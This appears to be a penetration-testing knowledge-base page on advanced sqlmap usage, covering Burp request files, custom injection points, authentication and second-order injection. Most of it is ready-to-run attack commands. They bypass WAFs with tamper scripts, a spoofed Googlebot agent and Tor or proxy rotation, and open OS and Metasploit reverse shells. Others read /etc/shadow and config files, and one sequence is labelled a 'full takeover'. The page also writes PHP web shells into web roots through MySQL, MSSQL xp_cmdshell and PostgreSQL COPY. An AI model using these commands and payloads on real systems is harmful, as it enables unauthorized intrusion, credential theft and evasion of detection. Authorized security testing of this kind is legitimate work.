---
title: "sqlmap - Advanced Usage"
category: "tool"
parent: "sqlmap"
tags: ["sql-injection", "advanced", "waf-bypass", "os-shell", "file-access"]
last_updated: "2025-12-27"
---

# sqlmap Advanced Usage

## Table of Contents

- [Using with Burp Suite](#using-with-burp-suite)
- [WAF/IPS Bypass](#wafips-bypass)
- [OS Shell Access](#os-shell-access)
- [File Read/Write](#file-readwrite)
- [Database Takeover](#database-takeover)
- [Custom Injection Points](#custom-injection-points)
- [Proxy Usage](#proxy-usage)
- [Authentication Handling](#authentication-handling)
- [Second-Order Injection](#second-order-injection)

---

## Using with Burp Suite

### Saving Requests from Burp

1. In Burp, right-click the request
2. Select "Copy to file" or "Save item"
3. Save as `request.txt`

### Using Saved Requests

```bash
# Basic usage with request file
sqlmap -r request.txt

# Specify injection point
sqlmap -r request.txt -p "id"

# With batch mode (no prompts)
sqlmap -r request.txt --batch

# Full enumeration from request file
sqlmap -r request.txt --dbs --batch
```

### Example Request File

```http
POST /login.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123; tracking=xyz
Content-Length: 32

username=admin&password=test123
```

### Request File with Injection Markers

```bash
# Mark specific injection point with *
# request.txt:
# POST /api/users HTTP/1.1
# Host: target.com
# Content-Type: application/json
#
# {"id": 1*, "action": "view"}

sqlmap -r request.txt --batch
```

---

## WAF/IPS Bypass

### Tamper Scripts

```bash
# List available tamper scripts
sqlmap --list-tampers

# Use single tamper script
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment

# Chain multiple tamper scripts
sqlmap -u "http://target.com/page.php?id=1" --tamper="space2comment,between,randomcase"
```

### Common Tamper Scripts

| Script | Description | Use Case |
|--------|-------------|----------|
| `apostrophemask` | Replace `'` with UTF-8 fullwidth | WAF filtering quotes |
| `base64encode` | Base64 encode payloads | Base64 decoded input |
| `between` | Replace `>` with `BETWEEN` | Comparison filtering |
| `charencode` | URL encode all characters | Basic WAF bypass |
| `charunicodeencode` | Unicode URL encode | Advanced encoding bypass |
| `equaltolike` | Replace `=` with `LIKE` | Equals sign filtering |
| `greatest` | Replace `>` with `GREATEST` | Comparison filtering |
| `randomcase` | Random character case | Case-sensitive filtering |
| `space2comment` | Replace space with `/**/` | Space filtering |
| `space2dash` | Replace space with `--\n` | Space filtering |
| `space2hash` | Replace space with `#\n` | MySQL space filtering |
| `space2mssqlblank` | Replace space with random blank chars | MSSQL space filtering |
| `space2mysqldash` | Replace space with `-- ` | MySQL space filtering |
| `space2plus` | Replace space with `+` | URL-encoded input |
| `space2randomblank` | Replace space with random whitespace | General bypass |
| `symboliclogical` | Replace `AND`/`OR` with `&&`/`||` | Keyword filtering |
| `unionalltounion` | Replace `UNION ALL` with `UNION` | Keyword filtering |
| `versionedkeywords` | Enclose keywords in versioned comment | MySQL bypass |
| `versionedmorekeywords` | Extended versioned comments | MySQL bypass |

### DBMS-Specific Tamper Scripts

```bash
# MySQL bypasses
sqlmap -u "URL" --tamper="versionedkeywords,space2comment,charencode" --dbms=mysql

# MSSQL bypasses
sqlmap -u "URL" --tamper="space2mssqlblank,between,charencode" --dbms=mssql

# PostgreSQL bypasses
sqlmap -u "URL" --tamper="space2comment,between,charencode" --dbms=postgresql
```

### Additional WAF Bypass Options

```bash
# Random User-Agent
sqlmap -u "URL" --random-agent

# Custom User-Agent
sqlmap -u "URL" --user-agent="Googlebot/2.1 (+http://www.google.com/bot.html)"

# Increase delay between requests
sqlmap -u "URL" --delay=2

# Randomize parameter values
sqlmap -u "URL" --randomize=id

# Use safe URL to reset WAF counters
sqlmap -u "URL" --safe-url="http://target.com/safe.php" --safe-freq=10

# Skip WAF detection
sqlmap -u "URL" --skip-waf

# Chunked transfer encoding
sqlmap -u "URL" --chunked

# HPP (HTTP Parameter Pollution)
sqlmap -u "URL" --hpp
```

---

## OS Shell Access

### Requirements

- Database user must have elevated privileges
- Writable directory on target
- Known web root path

### Getting an OS Shell

```bash
# Interactive OS shell
sqlmap -u "URL" --os-shell

# Specify web root
sqlmap -u "URL" --os-shell --web-root="/var/www/html"

# Execute single command
sqlmap -u "URL" --os-cmd="whoami"

# PowerShell command (Windows)
sqlmap -u "URL" --os-cmd="powershell -c Get-Process"
```

### Database-Specific Methods

#### MySQL

```bash
# Requires FILE privilege and secure_file_priv not set
sqlmap -u "URL" --os-shell --dbms=mysql

# UDF injection (advanced)
sqlmap -u "URL" --udf-inject --shared-lib=/path/to/lib
```

#### MSSQL

```bash
# Uses xp_cmdshell
sqlmap -u "URL" --os-shell --dbms=mssql

# Enable xp_cmdshell if disabled
sqlmap -u "URL" --os-shell --dbms=mssql --enable-xp-cmdshell

# Specify MSSQL architecture
sqlmap -u "URL" --os-shell --dbms=mssql --msf-path=/path/to/msf
```

#### PostgreSQL

```bash
# Uses COPY TO PROGRAM (9.3+)
sqlmap -u "URL" --os-shell --dbms=postgresql
```

### Reverse Shell

```bash
# Metasploit integration
sqlmap -u "URL" --os-pwn

# Specify MSF path
sqlmap -u "URL" --os-pwn --msf-path=/opt/metasploit-framework

# Meterpreter shell type
sqlmap -u "URL" --os-pwn --priv-esc
```

---

## File Read/Write

### Reading Files

```bash
# Read single file
sqlmap -u "URL" --file-read="/etc/passwd"

# Read Windows file
sqlmap -u "URL" --file-read="C:/Windows/System32/drivers/etc/hosts"

# Read multiple files
sqlmap -u "URL" --file-read="/etc/passwd" --file-read="/etc/shadow"

# Read web application files
sqlmap -u "URL" --file-read="/var/www/html/config.php"
```

### Writing Files

```bash
# Write local file to remote
sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Specify writable directory
sqlmap -u "URL" --file-write="shell.php" --file-dest="/tmp/shell.php"

# Write with specific technique
sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/html/x.php" --technique=S
```

### Database-Specific File Operations

#### MySQL

```sql
-- Requires FILE privilege
-- secure_file_priv must allow the path

-- Read file
SELECT LOAD_FILE('/etc/passwd');

-- Write file
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

#### MSSQL

```sql
-- Read file (OLE Automation)
DECLARE @content VARCHAR(8000);
EXEC sp_oacreate 'Scripting.FileSystemObject', @fso OUT;

-- Write file via BCP
EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php';
```

#### PostgreSQL

```sql
-- Read file
SELECT pg_read_file('/etc/passwd', 0, 1000000);

-- Write file (9.3+)
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

---

## Database Takeover

### SQL Shell

```bash
# Interactive SQL shell
sqlmap -u "URL" --sql-shell

# Execute SQL query
sqlmap -u "URL" --sql-query="SELECT * FROM users"
```

### Privilege Escalation

```bash
# Check if current user is DBA
sqlmap -u "URL" --is-dba

# Enumerate privileges
sqlmap -u "URL" --privileges

# Enumerate roles
sqlmap -u "URL" --roles
```

### Registry Access (MSSQL on Windows)

```bash
# Read registry value
sqlmap -u "URL" --reg-read --reg-key="HKLM\Software\Microsoft\Windows NT\CurrentVersion" --reg-value="ProductName"

# Write registry value
sqlmap -u "URL" --reg-add --reg-key="HKLM\Software\Test" --reg-value="data" --reg-data="value" --reg-type=REG_SZ

# Delete registry value
sqlmap -u "URL" --reg-del --reg-key="HKLM\Software\Test" --reg-value="data"
```

### Complete Takeover Commands

```bash
# Full takeover sequence
sqlmap -u "URL" \
    --is-dba \
    --passwords \
    --file-read="/etc/passwd" \
    --os-shell \
    --batch
```

---

## Custom Injection Points

### Marking Injection Points

Use `*` to mark custom injection points:

```bash
# In URL parameter
sqlmap -u "http://target.com/page.php?id=1*&cat=2"

# In POST data
sqlmap -u "URL" --data="user=admin*&pass=test"

# In Cookie
sqlmap -u "URL" --cookie="session=abc123*"

# In headers
sqlmap -u "URL" --headers="X-Forwarded-For: 127.0.0.1*"
```

### JSON Injection

```bash
# Mark in JSON body
# request.txt:
# POST /api HTTP/1.1
# Content-Type: application/json
#
# {"id": 1*, "data": "test"}

sqlmap -r request.txt

# Or via command line
sqlmap -u "URL" --data='{"id": 1, "data": "test"}' -p id
```

### XML Injection

```bash
# request.txt:
# POST /api HTTP/1.1
# Content-Type: application/xml
#
# <request><id>1*</id></request>

sqlmap -r request.txt
```

### Header Injection

```bash
# User-Agent injection
sqlmap -u "URL" --user-agent="Mozilla/5.0*" --level=3

# Referer injection
sqlmap -u "URL" --referer="http://target.com/page.php?ref=1*" --level=3

# Custom header
sqlmap -u "URL" --headers="X-Custom-Header: value*" --level=3
```

---

## Proxy Usage

### HTTP Proxy

```bash
# Use Burp as proxy
sqlmap -u "URL" --proxy="http://127.0.0.1:8080"

# Proxy with authentication
sqlmap -u "URL" --proxy="http://user:pass@127.0.0.1:8080"

# SOCKS proxy
sqlmap -u "URL" --proxy="socks5://127.0.0.1:1080"
```

### Tor Network

```bash
# Through Tor
sqlmap -u "URL" --proxy="socks5://127.0.0.1:9050"

# Verify Tor connection
sqlmap -u "URL" --tor --check-tor

# Tor with automatic identity rotation
sqlmap -u "URL" --tor --tor-type=SOCKS5 --tor-port=9050
```

### Proxy Rotation

```bash
# Proxy list file
sqlmap -u "URL" --proxy-file=proxies.txt

# proxies.txt format:
# http://proxy1:8080
# http://proxy2:8080
# socks5://proxy3:1080
```

### Ignore Proxy Errors

```bash
# Continue on proxy errors
sqlmap -u "URL" --proxy="http://127.0.0.1:8080" --ignore-proxy
```

---

## Authentication Handling

### HTTP Basic Auth

```bash
# Basic authentication
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Basic --auth-cred="admin:password"

# Digest authentication
sqlmap -u "URL" --auth-type=Digest --auth-cred="admin:password"

# NTLM authentication
sqlmap -u "URL" --auth-type=NTLM --auth-cred="DOMAIN\user:password"
```

### Cookie-Based Auth

```bash
# Set session cookie
sqlmap -u "URL" --cookie="PHPSESSID=abc123; logged_in=true"

# Load cookies from file
sqlmap -u "URL" --load-cookies=cookies.txt

# Auto-update cookies from Set-Cookie
sqlmap -u "URL" --cookie="session=abc" --drop-set-cookie
```

### Certificate-Based Auth

```bash
# Client certificate
sqlmap -u "https://target.com/page.php?id=1" --auth-file=client.pem

# With certificate password
sqlmap -u "URL" --auth-file=client.p12 --auth-cert="password"
```

### Form-Based Authentication

```bash
# Two-step auth: login first, then test
# Step 1: Get session via login
curl -c cookies.txt -d "user=admin&pass=test" http://target.com/login.php

# Step 2: Use cookies in sqlmap
sqlmap -u "http://target.com/page.php?id=1" --load-cookies=cookies.txt
```

### CSRF Token Handling

```bash
# Specify token parameter
sqlmap -u "URL" --csrf-token="csrf_token"

# Specify URL to refresh token
sqlmap -u "URL" --csrf-token="token" --csrf-url="http://target.com/gettoken"

# Eval to extract token (using JavaScript-like syntax)
sqlmap -u "URL" --eval="import re; token=re.search('csrf=([^&]+)', response).group(1)"
```

---

## Second-Order Injection

Second-order SQL injection occurs when user input is stored and later used in a different SQL query.

### Detection

```bash
# Specify second-order URL
sqlmap -u "http://target.com/register.php" \
    --data="username=admin&password=test" \
    --second-url="http://target.com/profile.php"

# With specific response comparison
sqlmap -u "URL" \
    --data="user=test&bio=test" \
    --second-url="http://target.com/viewprofile.php?user=test" \
    --second-req=viewprofile.txt
```

### Common Scenarios

1. **Registration -> Profile View**
   - Inject during user registration
   - Payload executed when profile is viewed

2. **Order Submission -> Order Report**
   - Inject in order form
   - Triggered when admin views report

3. **Log Entry -> Log Viewer**
   - Inject via logged action
   - Executed when logs are displayed

### Example Workflow

```bash
# Step 1: Inject payload in registration
sqlmap -u "http://target.com/register.php" \
    --data="username=admin'--&email=test@test.com" \
    --second-url="http://target.com/admin/users.php" \
    --batch

# Step 2: Test with time-based if blind
sqlmap -u "http://target.com/register.php" \
    --data="username=test&email=test@test.com" \
    --second-url="http://target.com/admin/users.php" \
    --technique=T \
    -p username
```

### Advanced Second-Order Options

```bash
# Use request file for second order
sqlmap -r register.txt --second-req=viewprofile.txt

# Specify string to identify successful injection
sqlmap -r register.txt \
    --second-url="http://target.com/view.php" \
    --string="Profile data"
```
